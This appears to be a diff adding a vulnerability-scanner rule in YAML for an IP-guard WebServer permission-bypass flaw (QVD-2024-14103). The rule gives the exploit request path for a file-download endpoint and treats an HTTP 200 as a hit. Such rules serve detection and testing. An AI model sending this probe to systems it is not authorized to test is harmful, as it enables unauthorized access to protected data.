@@ -1,0 +1,3 @@
+name: "IP-guard WebServer存在权限绕过漏洞(QVD-2024-14103)"
+poc: "/ipg/appr/MApplyList/downloadFile_client/getdatarecord"
+status_code: 200
